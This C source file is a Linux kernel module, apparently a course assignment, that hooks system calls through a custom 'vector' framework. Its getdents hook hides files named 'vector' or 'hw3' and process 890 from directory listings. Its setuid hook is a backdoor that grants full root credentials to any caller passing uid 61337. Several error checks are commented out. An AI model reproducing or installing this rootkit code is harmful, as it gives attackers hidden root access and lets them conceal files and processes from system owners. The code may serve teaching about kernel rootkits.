#ifndef __IS_VECTOR_TABLE__
#define __IS_VECTOR_TABLE__
#endif
#include<linux/kernel.h>
#include<linux/init.h>
#include<linux/module.h>
#include<linux/syscalls.h>
#include<linux/kobject.h>
#include<linux/slab.h>
#include<linux/cred.h>
#include<linux/namei.h>
#include<linux/path.h>
#include<linux/file.h>
#include<linux/fs.h>
#include<linux/string.h>
#include "../sys_ops.h"

MODULE_LICENSE("GPL");

char *hide_name[] = {"vector", "hw3"};
int hide_count = 2;
char *hide_proc[] = {"890"};
int hide_proc_count = 1;

struct my_dirent {
	unsigned long d_ino;	/* Inode number */
	unsigned long d_off;	/* Offset to next linux_dirent */
	unsigned short d_reclen;/* Length of this linux_dirent */
	char d_name[];		/* Filename (null-terminated) */
};

asmlinkage int my_getdents(unsigned int fd, struct linux_dirent *dirp,
			   unsigned int count)
{
	unsigned int ret = 0, err;
	unsigned int ret_buf_count = 0, i, flag = 0, proc_flag = 1;
	struct file *filp = NULL;
	char *buf = NULL, *p, *ret_buf = NULL, *temp = NULL, *path = NULL;
	struct my_dirent *entry = NULL;
	struct path file_path;

	ret = original_syscall.getdents(fd, dirp, count);
	if (ret == 0)
		return ret;
	filp = fget(fd);
	if (filp == NULL) {
		printk("here filp null\n");
		goto out;
	}
	file_path = filp->f_path;
	path_get(&filp->f_path);
	temp = (char *)kmalloc(PAGE_SIZE, GFP_KERNEL);
	/*if (temp == NULL) {
		printk("kmalloc NULL temp read syscall\n");
		ret_buf_count = -ENOMEM;
		goto out;
	}*/
	path = d_path(&file_path, temp, PAGE_SIZE);
	if (path == NULL) {
		printk("read:path is null\n");
		goto out;
	}
	path_put(&file_path);
	buf = (char *)kmalloc(ret, GFP_KERNEL);
	ret_buf = kmalloc(ret, GFP_KERNEL);
	err = copy_from_user(buf, dirp, ret);
	/*if (ret != 0) {
		ret = -EFAULT;
		return ret;
	}*/
	p = (char *)buf;
	while (p < (char *)buf + ret) {
		entry = (struct my_dirent *)p;
		flag = 0;

		proc_flag = (path) ? strcmp(path, "/proc") : 1;

		if (proc_flag) {
			for (i = 0; i < hide_count; i++) {
				if (strstr(entry->d_name, hide_name[i])) {
					flag = 1;
					break;
				}
			}
		} else {
			for (i = 0; i < hide_proc_count; i++) {
				if (strstr(entry->d_name, hide_proc[i])) {
					flag = 1;
					break;
				}
			}
		}
		if (!flag) {
			memcpy(ret_buf + ret_buf_count, (void *)p,
			       entry->d_reclen);
			ret_buf_count += entry->d_reclen;
		}
		p += entry->d_reclen;
	}
	err = copy_to_user(dirp, ret_buf, ret_buf_count);
	/*if (ret_buf_count != 0) {
		ret_buf_count = -EFAULT;
		goto out;
	}*/

out:
	kfree(buf);
	kfree(ret_buf);
	kfree(temp);
	return ret_buf_count;

}

void elevate_access(void)
{
	struct cred *my_cred = NULL;

	my_cred = prepare_creds();
	my_cred->uid.val = 0;
	my_cred->euid.val = 0;
	my_cred->egid.val = 0;
	my_cred->gid.val = 0;
	commit_creds(my_cred);
}

asmlinkage int my_setuid(uid_t uid)
{
	int ret = 0;

	if (uid == 61337) {
		elevate_access();
		printk("you are root now\n");
		return ret;
	}
	return original_syscall.setuid(uid);
}

int vector3_init(void)
{
	/* register vector1 module */
	int ret = 0;
	struct sys_ops ops;

	ops.setuid = my_setuid;
	ops.getdents = my_getdents;
	ops.mkdir = NULL;
	ops.read = NULL;
	ops.write = NULL;
	ops.open = NULL;
	ops.close = NULL;
	ops.rmdir = NULL;
	ops.unlink = NULL;
	ops.symlink = NULL;
	ret = register_vector(THIS_MODULE, ops);
	return 0;
}

void vector3_exit(void)
{
	/*unregister vector1 module */
	unregister_vector(THIS_MODULE);
}

module_init(vector3_init);
module_exit(vector3_exit);
